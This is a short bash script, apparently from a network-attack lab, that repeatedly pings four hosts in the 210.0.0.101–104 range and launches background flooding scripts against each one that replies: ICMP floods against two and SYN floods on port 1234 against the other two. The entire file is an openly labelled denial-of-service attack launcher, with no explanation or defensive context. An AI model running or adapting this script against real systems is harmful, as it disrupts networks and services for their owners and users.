while true; do
	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
	then
			echo "Bhost 1 found - ICMP attack"
			sh icmp/flooder_simple.sh 210.0.0.101 & 
	fi
	if (( ping 210.0.0.102 -c 1 | grep -q 'from'))
	then
			echo "Bhost 2 found - ICMP attack"
			sh icmp/flooder_simple.sh 210.0.0.102 &
	fi

	if (( ping 210.0.0.103 -c 1 | grep -q 'from'))
	then
			echo "Bhost 3 found - SYN attack"
			sh syn-flood/flooder_simple.sh 210.0.0.103 1234 &
	fi
	if (( ping 210.0.0.104 -c 1 | grep -q 'from'))
	then
			echo "Bhost 4 found - SYN attack"
			sh syn-flood/flooder_simple.sh 210.0.0.104 1234 &
	fi
done
